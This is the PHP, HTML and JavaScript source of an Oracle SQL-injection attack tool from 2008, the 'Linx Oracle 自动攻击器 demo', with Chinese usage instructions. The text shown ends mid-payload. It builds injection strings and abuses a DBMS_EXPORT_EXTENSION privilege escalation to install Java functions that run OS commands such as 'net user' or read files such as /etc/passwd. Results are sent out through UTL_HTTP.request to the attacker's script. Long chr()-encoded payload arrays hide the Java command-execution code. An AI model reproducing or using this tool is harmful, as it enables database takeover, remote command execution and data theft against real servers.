<?
/*
* Linx Oracle 自动攻击器 demo
* 2008.3.25,linx2008@gmail.com
* 利用条件： 
* 1.oracle服务器可以读取当前php脚本
* 2.要运行系统命令，请先在oralce服务器创建 sys.LinxRunCMD() 函数
* 
* 提示：
* 要获得cookie，请运行 javascript:document.cookie=window.prompt("Edit cookie:",document.cookie);void(0);
* 注射方式：为必填内容，注射语句用"(<**>)"代替。
* 使用步骤：
* 
* eg：如果你的注射地址是 http://host/test.jsp?action=read&id=123，则
* 1.输入"注射地址",
* 2.点击"数值型" or "字符型型"，此时自动生成 注射方式:http://host/test.jsp?action=read&id=123 and chr(1) not in (<**>)
* 3.如果你没有创建函数，请先点击“创建函数”
* 4.选择操作：运行命令 or读取文件 
* 5.输入命令，选择"生成语句"，再点击 运行语句
* 
*/
@set_time_limit(0);
if($_REQUEST[step]) {
	//安装函数
	$step=$_REQUEST[step];
	$step=intval($step);
	if($step==0) {
		$step=1;
	}
	$codes = get_shellcode();
	echo '<meta http-equiv="Content-Type" content="text/html; charset=gb2312">';
	$URL_TO_POST = $_REQUEST[Submit2]?$_REQUEST[url2]:$_REQUEST[url2];
	$URL_TO_POST=trim($URL_TO_POST);
	$URL_TO_POST = str_replace("<**>",$codes[$step],$URL_TO_POST);
	$URL_TO_POST=stripslashes($URL_TO_POST);
	$query=substr($URL_TO_POST, strpos($URL_TO_POST,"?")+1);
	parse_str($query,$data);
	foreach($data as $key=>$val) {
		$data[$key]=stripslashes($val);
	}
	$out = HTTP_Post($URL_TO_POST,$data, $referrer,$_REQUEST[cookie]);
	if($out[1]===false) exit("无法远程服务器连接服务器! ( $_REQUEST[url2] )");
	//print_r($data);
	echo "<br><br>";

	if($step !="6") {
		echo "<a href='?step=".($step+1)."&url2=".urlencode(stripslashes($_REQUEST[url2]))."&cookie=".urlencode(stripslashes($_REQUEST[cookie]))."'>下一步 (now: $step / 6)</a><br>";
	} else {
		echo "创建函数结束，请尝试运行函数。<a href='?do=nothing'>返回调用函数</a><br>";
	}
	echo "<br><br>所发请求：<BR><textarea name='url' cols='100' rows='8'>$out[0]</textarea><br><br>";
	echo "<BR>返回结果：<BR>";
	echo $out[1];
	exit;
}


if($_GET[act]) {
	//oralce 返回数据
	$onlineip = GetIP(); //客户端的IP
	$f=fopen("oracle_record.txt","w+");
	fwrite($f,"\r\nOracle服务器IP: ".$onlineip.":\r\n\r\n".stripslashes($_REQUEST[act])."\r\n\r\n");
	fclose($f);
	echo "Hello,Oracle!";
	exit();
}


if($_REQUEST[test]) {
	echo '<meta http-equiv="Content-Type" content="text/html; charset=gb2312">';
	$URL_TO_POST = $_REQUEST[Submit2]?$_REQUEST[url2]:$_REQUEST[url2];
	$URL_TO_POST=trim($URL_TO_POST);

	$codes = "SELECT chr(2)||UTL_HTTP.request(".to_chr($_REQUEST[location_url]."?act=sys.login_user:")."||sys.login_user) FROM all_tables where rownum=1";

	$URL_TO_POST = str_replace("<**>",$codes,$URL_TO_POST);
	$URL_TO_POST=stripslashes($URL_TO_POST);
	$query=substr($URL_TO_POST, strpos($URL_TO_POST,"?")+1);
	parse_str($query,$data);
	foreach($data as $key=>$val) {
		$data[$key]=stripslashes($val);
	}
	$out = HTTP_Post($URL_TO_POST,$data, $referrer,$_REQUEST[cookie]);
	//print_r($data);
	if($out[1]===false) exit ("无法远程服务器连接服务器! ( $_REQUEST[url2] )");
	echo "<br><br>所发请求：<BR><textarea name='url' cols='100' rows='8'>$out[0]</textarea><br><br>";

	if(file_exists("oracle_record.txt")) {
		echo "恭喜你，Oracle服务器可以通过 UTL_HTTP.request 连接当前PHP脚本。\r\n";
		echo "执行结果：<BR><textarea name='url' cols='100' rows='10'>";
		echo "以下为 Oracle sys.login_user：\r\n";
		readfile("oracle_record.txt");
		unlink("oracle_record.txt");
		echo "</textarea><br>";
	}else {
		echo "Oracle服务器不能连接这个PHP脚本(".$_REQUEST[location_url]."),因此这个PHP脚本可能无法远程读取oracle的数据。<br><br> $URL_TO_POST <br><br><br>";
	}
	echo "<br><br>";
	echo $out[1];
	exit;
}



if($_REQUEST[test2]) {
	echo '<meta http-equiv="Content-Type" content="text/html; charset=gb2312">';
	$URL_TO_POST = $_REQUEST[Submit2]?$_REQUEST[url2]:$_REQUEST[url2];
	$URL_TO_POST=trim($URL_TO_POST);

	$codes = "select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(chr(70)||chr(79)||chr(79),chr(66)||chr(65)||chr(82),".
		to_chr("DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE 'declare temp varchar2(200);BEGIN  select ''||UTL_HTTP.request(''".$_REQUEST[location_url]."?act=test2'') into temp FROM all_tables where rownum=1;END;';END;--").",chr(83)||chr(89)||chr(83),0,chr(49),0) FROM all_tables where rownum=1";

	$URL_TO_POST = str_replace("<**>",$codes,$URL_TO_POST);
	$URL_TO_POST=stripslashes($URL_TO_POST);
	$query=substr($URL_TO_POST, strpos($URL_TO_POST,"?")+1);
	parse_str($query,$data);
	foreach($data as $key=>$val) {
		$data[$key]=stripslashes($val);
	}
	$out = HTTP_Post($URL_TO_POST,$data, $referrer,$_REQUEST[cookie]);
	//print_r($data);
	if($out[1]===false) exit ("无法远程服务器连接服务器! ( $_REQUEST[url2] )");
	echo "<br><br>所发请求：<BR><textarea name='url' cols='100' rows='8'>$out[0]</textarea><br><br>";

	if(file_exists("oracle_record.txt")) {
		echo "执行结果：<BR><textarea name='url' cols='100' rows='10'>";
		echo "恭喜你，Oracle服务器存在漏洞，你可以远程创建sys.LinxRunCMD、sys.LinxReadFile函数执行系统命令。\r\n\r\n";
		unlink("oracle_record.txt");
		echo "</textarea><br><br><br>";
	}else {
		echo "Oracle服务器不能连接这个PHP脚本(".$_REQUEST[location_url]."),因此这个PHP脚本可能无法远程读取oracle的数据。<br><br>";
	}
	echo $out[1];
	exit;
}


if($_REQUEST[shellcode]) {
	echo '<meta http-equiv="Content-Type" content="text/html; charset=gb2312">';

	$URL_TO_POST = $_REQUEST[Submit2]?$_REQUEST[shellcode2]:$_REQUEST[shellcode];
	$URL_TO_POST=stripslashes($URL_TO_POST);
	$URL_TO_POST=trim($URL_TO_POST);

	$query=substr($URL_TO_POST, strpos($URL_TO_POST,"?")+1);

	parse_str($query,$data);

	foreach($data as $key=>$val) {
		$data[$key]=stripslashes($val);
	}
	$out = HTTP_Post($URL_TO_POST,$data, $referrer,$_REQUEST[cookie]);

	if($out[1]===false) exit("无法远程服务器连接服务器! ( $_REQUEST[url2] )");
	echo "<br><br>所发请求：<BR><textarea name='url' cols='100' rows='8'>$out[0]</textarea><br><br>";

	echo "执行结果：<BR><textarea name='url' cols='120' rows='20'>";
	if(file_exists("oracle_record.txt")) {
		readfile("oracle_record.txt");
		unlink("oracle_record.txt");
	}else {
		echo "Oracle服务器没有返回执行结果，可能是 Oracle服务器不能连接这个PHP脚本(".get_self().")。";
	}
	echo "</textarea><br>";
	echo $out[1];
	exit;
}
 


?><head>
<title>Linx Oracle 自动攻击器  -demo</title>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<style>
BODY {
	FONT-SIZE: 10pt;  MARGIN: 0px; COLOR: #000000; FONT-FAMILY: "宋体"
}
A:link {
	FONT-SIZE: 10pt; COLOR: #3333ff; FONT-FAMILY: "宋体"; TEXT-DECORATION: none
}
A:hover {
	COLOR: #ff0000; TEXT-DECORATION: none
}
A:active {
	COLOR: #ff0000
}
INPUT {
	FONT-SIZE: 9pt; FONT-FAMILY: "宋体"
}
INPUT.ButtonFlat1 {
	BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; FONT-SIZE: 12px; BORDER-LEFT: #000000 1px solid; COLOR: #000000; LINE-HEIGHT: 100%; PADDING-TOP: 2px; BORDER-BOTTOM: #000000 1px solid; FONT-FAMILY: "宋体"; BACKGROUND-COLOR: #e4faf7
}

INPUT.BrowseFlat {
	BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; FONT-SIZE: 12px; BORDER-LEFT: #000000 1px solid; COLOR: #000000; LINE-HEIGHT: 100%; PADDING-TOP: 2px; BORDER-BOTTOM: #000000 1px solid; FONT-FAMILY: "宋体"
}
INPUT.TextFlat {
	BORDER-RIGHT: #4d4d4d 1px solid; BORDER-TOP: #4d4d4d 1px solid; FONT-SIZE: 11pt; BORDER-LEFT: #4d4d4d 1px solid; COLOR: #000000; BORDER-BOTTOM: #4d4d4d 1px solid; HEIGHT: 20px; BACKGROUND-COLOR: #ffffff
}
TEXTAREA.AreaFlat {
	BORDER-RIGHT: #707070 1px solid; BORDER-TOP: #707070 1px solid; FONT-SIZE: 11pt; BORDER-LEFT: #707070 1px solid; COLOR: #090000; BORDER-BOTTOM: #707070 1px solid; FONT-FAMILY: "宋体"
}
.table1 {
	BACKGROUND-COLOR: #6189b0
}
.tabHead {
	FONT-SIZE: 10pt; COLOR: #0066cc; FONT-FAMILY: "宋体"; BACKGROUND-COLOR: #beddf1
}
.tabHead1 {
	FONT-SIZE: 10pt; COLOR: #000000; FONT-FAMILY: "宋体"; BACKGROUND-COLOR: #ffcf60
}
.tabState {
	FONT-SIZE: 10pt; COLOR: #000000; FONT-FAMILY: "宋体"; BACKGROUND-COLOR: #e7f7ff
}
.tabField {
	FONT-SIZE: 10pt; COLOR: #000000; FONT-FAMILY: "宋体"; BACKGROUND-COLOR: #e7f7ff
}
.tabValue {
	FONT-SIZE: 10pt; COLOR: #000000; FONT-FAMILY: "宋体"; BACKGROUND-COLOR: #ffffff
}
.tabValue1 {
	FONT-SIZE: 10pt; COLOR: #000000; FONT-FAMILY: "宋体"; BACKGROUND-COLOR: #e7f7ff
}
</style>
</head>



<script language="JavaScript" type="text/javascript">




function to_chr(str){
var temp="";
for(i=0;i<str.length;i++){
temp += "chr("+str.charCodeAt(i) +")||";
}
return temp.substr(0, temp.length-2);
}

function get_shellcode1(cmd){
var str;
str = LinxForm.url2.value.replace("<**>","SELECT UTL_HTTP.request("+to_chr(LinxForm.location_url.value+"?act=run:")+"||REPLACE(REPLACE(sys.LinxRunCMD("+to_chr(LinxForm.cmd.value)+"),chr(32),chr(37)||chr(50)||chr(48)),chr(10),chr(37)||chr(48)||chr(65))) FROM all_tables where rownum=1")
if(LinxForm.cmd_type[1].checked) return str = str.replace("sys.LinxRunCMD","sys.LinxReadFile");
return str;
}


function get_shellcode1_(cmd){

var str;
str = LinxForm.url2.value.replace("<**>","SELECT UTL_HTTP.request('"+LinxForm.location_url.value+"?act=run:"+"'||REPLACE(REPLACE(sys.LinxRunCMD('"+LinxForm.cmd.value+"'),chr(32),chr(37)||chr(50)||chr(48)),chr(10),chr(37)||chr(48)||chr(65))) FROM all_tables where rownum=1")
if(LinxForm.cmd_type[1].checked) return str = str.replace("sys.LinxRunCMD","sys.LinxReadFile");
return str;
}

function get_shellcode2(cmd){

var str;
str = LinxForm.url2.value.replace("<**>","SELECT sys.LinxReadFile("+to_chr(LinxForm.location_url.value+"?act=run:")+"||REPLACE(REPLACE(sys.LinxRunCMD("+to_chr(LinxForm.cmd.value)+"),chr(32),chr(37)||chr(50)||chr(48)),chr(10),chr(37)||chr(48)||chr(65))) FROM all_tables where rownum=1")

if(LinxForm.cmd_type[1].checked) return str = str.replace("sys.LinxRunCMD","sys.LinxReadFile");
return str;
}


function get_shellcode2_(cmd){

var str;
str = LinxForm.url2.value.replace("<**>","SELECT sys.LinxReadFile('"+LinxForm.location_url.value+"?act=run:"+"'||REPLACE(REPLACE(sys.LinxRunCMD('"+LinxForm.cmd.value+"'),chr(32),chr(37)||chr(50)||chr(48)),chr(10),chr(37)||chr(48)||chr(65))) FROM all_tables where rownum=1")
if(LinxForm.cmd_type[1].checked) return str = str.replace("sys.LinxRunCMD","sys.LinxReadFile");
return str;
}

function get_shellcode3(cmd){

var str;
str = LinxForm.url2.value.replace("<**>","SELECT length("+to_chr(LinxForm.location_url.value+"?act=run:")+"||REPLACE(REPLACE(sys.LinxRunCMD("+to_chr(LinxForm.cmd.value)+"),chr(32),chr(37)||chr(50)||chr(48)),chr(10),chr(37)||chr(48)||chr(65))) FROM all_tables where rownum=1")

if(LinxForm.cmd_type[1].checked) return str = str.replace("sys.LinxRunCMD","sys.LinxReadFile");
return str;
}


function get_shellcode3_(cmd){

var str;
str = LinxForm.url2.value.replace("<**>","SELECT length('"+LinxForm.location_url.value+"?act=run:"+"'||REPLACE(REPLACE(sys.LinxRunCMD('"+LinxForm.cmd.value+"'),chr(32),chr(37)||chr(50)||chr(48)),chr(10),chr(37)||chr(48)||chr(65))) FROM all_tables where rownum=1")
if(LinxForm.cmd_type[1].checked) return str = str.replace("sys.LinxRunCMD","sys.LinxReadFile");
return str;
}
</script>


<br /><br />

<form action="" method="post" name="LinxForm" target ="_blank">


<table class=table1 border=0 cellspacing=1 cellpadding="4" width="81%" align="center">

  <tr class=tabHead>
<td width='20%' height=25 colspan=2 align="center" valign="middle" class=tabHead><strong>Linx Oracle 自动攻击器  -demo</strong></td>
</tr>
	<tr class=tabHead>
      <td align="left" class="tabField" width="20%" >注射地址：</td>
      <td align="left" class="tabValue"><textarea name="url" cols="100" rows="2">http://host/test.jsp?action=read&amp;id=123</textarea></td>
    </tr>
	<tr class=tabHead>
      <td align="left" class="tabField">Cookie:</td>
      <td align="left" class="tabValue"><input name="cookie" type="text" size="80" maxlength="100"/>
      (没有可以不填) </td>
    </tr>
	<tr class=tabHead>
      <td align="left" class="tabField">参数类型：</td>
      <td align="left" class="tabValue"><input name="type" type="radio" value="123" onclick="LinxForm.url2.value=LinxForm.url.value+' and chr(1) not in (&lt;**&gt;)'"/>
        数值型
          <input name="type" type="radio" value="123" onclick="LinxForm.url2.value=LinxForm.url.value+'\' and chr(1) not in (&lt;**&gt;)||\''"/>
          字符型
          <input name="type" type="radio" value="123" onclick="LinxForm.url2.value=LinxForm.url.value+'\' and chr(1) not in (&lt;**&gt;)--'"/>
      字符型2 &nbsp; &nbsp; <input type="button" name="tttttt"  onclick='LinxForm.url2.value=LinxForm.url2.value.replace(" and "," or ")' value="查询条件改为or" /></td> 
    </tr>
    <tr class=tabHead>
      <td align="left" class="tabField">注射方式：(可自行修改)</td>
      <td align="left" class="tabValue"><textarea name="url2" cols="100" rows="3"></textarea></td>
    </tr>
	
	   <tr>
      <td align="left" class="tabField">  当前PHP脚本URL: </td>
      <td align="left" class="tabValue">
        <input name="location_url" type="text" value='' size="80" maxlength="80"/>
        
        <br />(请确保这个地址能让oracle访问到，否则执行的命令无回显)</td>
    </tr>
	
	   <tr>
      <td align="left" class="tabField">选择操作：</td>
      <td align="left" class="tabValue"><input type="submit" name="test" value="测试UTL_HTTP.request" />&nbsp;&nbsp;&nbsp;
        <input type="submit" name="test2" value="测试注入函数" />&nbsp;&nbsp;&nbsp;
       <input type="submit" name="step" value="创建sys.LinxRunCMD()、sys.LinxReadFile()函数" /> </td>
    </tr> 
   <tr>
      <td align="left" class="tabField"><strong>操作：</strong></td>
      <td align="left" class="tabValue"><input name="cmd_type" type="radio" onclick="LinxForm.cmd.value='cmd /c net user'" value="1" checked="checked"/>
运行命令
  <input name="cmd_type" type="radio" value="2" onclick="LinxForm.cmd.value='/etc/passwd'"/>
读取文件 </td>
    </tr>
	   <tr>
      <td align="left" class="tabField"><strong>CMD 命令/文件名：</strong></td>
      <td align="left" class="tabValue"><input name="cmd" type="text" value='cmd /c net user' size="80" maxlength="100"/>  
        (  /bin/bash -help  )  </td>
    </tr>
	   <tr>
      <td align="left" class="tabField"><p><font color="red"><b>生成语句</b></font><font color="red"><b>(每次输入命令都必须选择一次)</b></font></p>
        </td>
      <td align="left" class="tabValue"><input name="type2" type="radio" value="1" onclick="LinxForm.shellcode.value=get_shellcode1();LinxForm.shellcode2.value=get_shellcode1_()"/>
UTL_HTTP.request 模式
  <input name="type2" type="radio" value="2" onclick="LinxForm.shellcode.value=get_shellcode2();LinxForm.shellcode2.value=get_shellcode2_()"/>
sys.LinxReadFile 模式
<input name="type2" type="radio" value="3" onclick="LinxForm.shellcode.value=get_shellcode3();LinxForm.shellcode2.value=get_shellcode3_()"/>
不返回 </td>
    </tr>




    <tr>
      <td align="left" class="tabField"><b>SQL语句：</b></td>
      <td align="left" class="tabValue"><textarea name="shellcode2" cols="100" rows="8"></textarea></td>
    </tr>
    <tr>
      <td width="20%" align="left" class="tabField"><p> 加密后的SQL语句：</p></td>
      <td width="717" align="left" class="tabValue"><textarea name="shellcode" cols="100" rows="2"></textarea></td>
    </tr>
    <tr>
      <td class="tabField">&nbsp;</td>
      <td class="tabValue"><input type="submit" name="Submit2" value="执行SQL明文语句" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
      <input type="submit" name="Submit" value="执行SQL密文语句" /></td>
    </tr>
	  <tr>
      <td colspan="2" align="left"  class="tabValue"><pre>
  
  /*
  * 说明：
  * Linx Oracle 自动攻击器-运行命令
  * 2008.3.25,linx2008@gmail.com
  * 作用：用于运行系统命令，读取文件，并显示运行结果
  * 利用条件： 
  * 1.oracle服务器可以读取当前php脚本
  * 2.要运行系统命令，请先在oralce服务器创建 sys.LinxRunCMD() 函数
  * 
  * 提示：
  * 1.要获得cookie，请运行 javascript:document.cookie=window.prompt("Edit cookie:",document.cookie);void(0);
  * 2."注射方式"为必填内容，注射语句用"(<**>)"代替。
  * 3.建议创建函数时先"测试UTL_HTTP.request"、"测试能否注入函数"。
  * 
  * 使用步骤：
  * 
  * eg：如果你的注射地址是 http://host/test.jsp?action=read&id=123，则
  * 1.输入"注射地址",
  * 2.点击"数值型" or "字符型型"，此时自动生成 注射方式:http://host/test.jsp?action=read&id=123 and chr(1) not in (<**>)
  * 3.如果你没有创建函数，请先点击“创建函数”
  * 4.选择操作：运行命令 or读取文件 
  * 5.输入命令，选择"生成语句"，再点击 运行语句
  * 
  */</PRE></td>
    </tr>
  </table>

</form>


  <script language="JavaScript" type="text/javascript">
LinxForm.location_url.value=document.URL;
</script>
  
  
  <?
function to_chr($a){
for($i=0; $i<strlen($a); $i++) {
	$str .="chr(".ord($a[$i]).")||";
}
return substr($str,0,-2);
}


function get_self(){
return "http://$_SERVER[SERVER_NAME]:$_SERVER[SERVER_PORT]".$_SERVER['PHP_SELF'];
}






function HTTP_Post($URL,$data, $referrer="",$cookie="") {
       // parsing the given URL
       $URL_Info=parse_url($URL);

       // Building referrer
       if($referrer=="") // if not given use this script as referrer
         $referrer="";

       // making string from $data
       foreach($data as $key=>$value)
         $values[]="$key=".urlencode($value);
       $data_string=implode("&",$values);

       // Find out which port is needed - if not given use standard (=80)
       if(!isset($URL_Info["port"]))
         $URL_Info["port"]=80;

       // building POST-request:
       $request.="POST ".$URL_Info["path"]." HTTP/1.1\n";
       $request.="Host: ".$URL_Info["host"]."\n";
       $request.="Referer: $referrer\n";
       $request.="Content-type: application/x-www-form-urlencoded\n";
       $request.="Content-length: ".strlen($data_string)."\n";
       $request.="Connection: close\n";
	   $request.="Cookie: $cookie\n";

       $request.="\n";
       $request.=$data_string."\n";
       $fp = fsockopen($URL_Info["host"],$URL_Info["port"]);
	   if(!$fp) {
	   		return array($request,false);
	   }
       fputs($fp, $request);
       while(!feof($fp)) {
           $line = fgets($fp,1024);
		   //echo $line;
		   $result .=$line;
		   if(strpos($line,"</html>")!==false) break;
       }
       @fclose($fp);
       return array($request,$result);
     }


function GetIP()
{
     if(getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')){
         $onlineip = getenv('HTTP_CLIENT_IP');
         list($onlineip,) = explode(",", $onlineip);
         $_SERVER["REMOTE_ADDR"] = $onlineip;
         }elseif(getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown')){
         $onlineip = getenv('HTTP_X_FORWARDED_FOR');
         list($onlineip,) = explode(",", $onlineip);
         $_SERVER["REMOTE_ADDR"] = $onlineip;
         }elseif(getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), 'unknown')){
         $onlineip = getenv('REMOTE_ADDR');
         list($onlineip,) = explode(",", $onlineip);
         $_SERVER["REMOTE_ADDR"] = $onlineip;
         }elseif(isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')){
         $onlineip = $_SERVER['REMOTE_ADDR'];
         list($onlineip,) = explode(",", $onlineip);
         $_SERVER["REMOTE_ADDR"] = $onlineip;
         }
     return $onlineip;
}

function get_shellcode() {
	return array(
"",
//1.创建包 1
"select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(chr(70)||chr(79)||chr(79),chr(66)||chr(65)||chr(82),chr(68)||chr(66)||chr(77)||chr(83)||chr(95)||chr(79)||chr(85)||chr(84)||chr(80)||chr(85)||chr(84)||chr(34)||chr(46)||chr(80)||chr(85)||chr(84)||chr(40)||chr(58)||chr(80)||chr(49)||chr(41)||chr(59)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||chr(84)||chr(69)||chr(32)||chr(73)||chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(68)||chr(69)||chr(67)||chr(76)||chr(65)||chr(82)||chr(69)||chr(32)||chr(80)||chr(82)||chr(65)||chr(71)||chr(77)||chr(65)||chr(32)||chr(65)||chr(85)||chr(84)||chr(79)||chr(78)||chr(79)||chr(77)||chr(79)||chr(85)||chr(83)||chr(95)||chr(84)||chr(82)||chr(65)||chr(78)||chr(83)||chr(65)||chr(67)||chr(84)||chr(73)||chr(79)||chr(78)||chr(59)||chr(66)||chr(69)||chr(71)||chr(73)||chr(78)||chr(32)||chr(69)||chr(88)||chr(69)||chr(67)||chr(85)||chr(84)||chr(69)||chr(32)||chr(73)||
chr(77)||chr(77)||chr(69)||chr(68)||chr(73)||chr(65)||chr(84)||chr(69)||chr(32)||chr(39)||chr(39)||chr(32)||chr(32)||chr(13)||chr(10)||chr(99)||chr(114)||chr(101)||chr(97)||chr(116)||chr(101)||chr(32)||chr(111)||chr(114)||chr(32)||chr(114)||chr(101)||chr(112)||chr(108)||chr(97)||chr(99)||chr(101)||chr(32)||chr(97)||chr(110)||chr(100)||chr(32)||chr(99)||chr(111)||chr(109)||chr(112)||chr(105)||chr(108)||chr(101)||chr(32)||chr(106)||chr(97)||chr(118)||chr(97)||chr(32)||chr(115)||chr(111)||chr(117)||chr(114)||chr(99)||chr(101)||chr(32)||chr(110)||chr(97)||chr(109)||chr(101)||chr(100)||chr(32)||chr(34)||chr(76)||chr(105)||chr(110)||chr(120)||chr(85)||chr(116)||chr(105)||chr(108)||chr(34)||chr(32)||chr(97)||chr(115)||chr(32)||chr(105)||chr(109)||chr(112)||chr(111)||chr(114)||chr(116)||chr(32)||chr(106)||chr(97)||chr(118)||chr(97)||chr(46)||chr(105)||chr(111)||chr(46)||chr(42)||chr(59)||chr(105)||chr(109)||chr(112)||chr(111)||chr(114)||chr(116)||chr(32)||chr(106)||chr(97)||chr(118)||chr(97)||chr(46)||chr(110)||chr(101)||chr(116)||chr(46)||chr(85)||chr(82)||chr(76)||chr(59)||chr(32)||chr(112)||chr(117)||chr(98)||chr(108)||chr(105)||
chr(99)||chr(32)||chr(99)||chr(108)||chr(97)||chr(115)||chr(115)||chr(32)||chr(76)||chr(105)||chr(110)||chr(120)||chr(85)||chr(116)||chr(105)||chr(108)||chr(32)||chr(101)||chr(120)||chr(116)||chr(101)||chr(110)||chr(100)||chr(115)||chr(32)||chr(79)||chr(98)||chr(106)||chr(101)||chr(99)||chr(116)||chr(32)||chr(123)||chr(112)||chr(117)||chr(98)||chr(108)||chr(105)||chr(99)||chr(32)||chr(115)||chr(116)||chr(97)||chr(116)||chr(105)||chr(99)||chr(32)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(32)||chr(114)||chr(117)||chr(110)||chr(67)||chr(77)||chr(68)||chr(40)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(32)||chr(97)||chr(114)||chr(103)||
chr(115)||chr(41)||chr(32)||chr(123)||chr(116)||chr(114)||chr(121)||chr(123)||chr(66)||chr(117)||chr(102)||chr(102)||chr(101)||chr(114)||chr(101)||chr(100)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(32)||chr(109)||chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(61)||chr(32)||chr(110)||chr(101)||chr(119)||chr(32)||chr(66)||chr(117)||chr(102)||chr(102)||chr(101)||chr(114)||chr(101)||chr(100)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(40)||chr(13)||chr(10)||chr(110)||chr(101)||chr(119)||chr(32)||chr(73)||chr(110)||chr(112)||chr(117)||chr(116)||chr(83)||chr(116)||chr(114)||chr(101)||chr(97)||chr(109)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(40)||chr(32)||chr(82)||chr(117)||chr(110)||chr(116)||chr(105)||chr(109)||chr(101)||chr(46)||chr(103)||chr(101)||chr(116)||chr(82)||chr(117)||chr(110)||chr(116)||chr(105)||
chr(109)||chr(101)||chr(40)||chr(41)||chr(46)||chr(101)||chr(120)||chr(101)||chr(99)||chr(40)||chr(97)||chr(114)||chr(103)||chr(115)||chr(41)||chr(46)||chr(103)||chr(101)||chr(116)||chr(73)||chr(110)||chr(112)||chr(117)||chr(116)||chr(83)||chr(116)||chr(114)||chr(101)||chr(97)||chr(109)||chr(40)||chr(41)||chr(32)||chr(41)||chr(32)||chr(41)||chr(59)||chr(32)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(32)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(44)||chr(115)||chr(116)||chr(114)||chr(61)||chr(34)||chr(34)||chr(59)||chr(119)||chr(104)||chr(105)||chr(108)||chr(101)||chr(32)||chr(40)||chr(40)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||
chr(32)||chr(61)||chr(32)||chr(109)||chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(46)||chr(114)||chr(101)||chr(97)||chr(100)||chr(76)||chr(105)||chr(110)||chr(101)||chr(40)||chr(41)||chr(41)||chr(32)||chr(33)||chr(61)||chr(32)||chr(110)||chr(117)||chr(108)||chr(108)||chr(41)||chr(32)||chr(115)||chr(116)||chr(114)||chr(32)||chr(43)||chr(61)||chr(115)||chr(116)||chr(101)||chr(109)||chr(112)||chr(43)||chr(34)||chr(92)||chr(110)||chr(34)||chr(59)||chr(109)||chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(46)||chr(99)||chr(108)||chr(111)||chr(115)||chr(101)||chr(40)||chr(41)||chr(59)||chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(115)||chr(116)
||chr(114)||chr(59)||chr(125)||chr(32)||chr(99)||chr(97)||chr(116)||chr(99)||chr(104)||chr(32)||chr(40)||chr(69)||chr(120)||chr(99)||chr(101)||chr(112)||chr(116)||chr(105)||chr(111)||chr(110)||chr(32)||chr(101)||chr(41)||chr(123)||chr(114)||chr(101)||chr(116)||chr(117)||chr(114)||chr(110)||chr(32)||chr(101)||chr(46)||chr(116)||chr(111)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(40)||chr(41)||chr(59)||chr(125)||chr(125)||chr(112)||chr(117)||chr(98)||chr(108)||chr(105)||chr(99)||chr(32)||chr(115)||chr(116)||chr(97)||chr(116)||chr(105)||chr(99)||chr(32)||chr(83)||chr(116)||chr(114)||chr(105)||chr(110)||chr(103)||chr(32)||chr(114)||chr(101)||chr(97)||chr(100)||chr(70)||chr(105)||chr(108)||chr(101)||chr(40)||chr(83)||chr(116)||chr(114)||chr(105)||
chr(110)||chr(103)||chr(32)||chr(102)||chr(105)||chr(108)||chr(101)||chr(110)||chr(97)||chr(109)||chr(101)||chr(41)||chr(123)||chr(116)||chr(114)||chr(121)||chr(123)||chr(66)||chr(117)||chr(102)||chr(102)||chr(101)||chr(114)||chr(101)||chr(100)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(32)||chr(109)||chr(121)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(61)||chr(32)||chr(110)||chr(101)||chr(119)||chr(32)||chr(66)||chr(117)||chr(102)||chr(102)||chr(101)||chr(114)||chr(101)||chr(100)||chr(82)||chr(101)||
chr(97)||chr(100)||chr(101)||chr(114)||chr(40)||chr(102)||chr(105)||chr(108)||chr(101)||chr(110)||chr(97)||chr(109)||chr(101)||chr(46)||chr(115)||chr(116)||chr(97)||chr(114)||chr(116)||chr(115)||chr(87)||chr(105)||chr(116)||chr(104)||chr(40)||chr(34)||chr(104)||chr(116)||chr(116)||chr(112)||chr(34)||chr(41)||chr(63)||chr(110)||chr(101)||chr(119)||chr(32)||chr(73)||chr(110)||chr(112)||chr(117)||chr(116)||chr(83)||chr(116)||chr(114)||chr(101)||chr(97)||chr(109)||chr(82)||chr(101)||chr(97)||chr(100)||chr(101)||chr(114)||chr(40)||chr(110)||chr(101)||chr(119)||chr(32)||chr(85)||chr(82)||chr(76)||chr(40)||chr(102)||chr(105)||chr(108)||chr(101)||chr(110)||chr(97)||chr(109)||chr(101)||chr(41)||chr(46)||chr(111)||chr(112)||chr(101)||chr(110)||chr(83)||chr(116)||chr(114)||chr(101)||
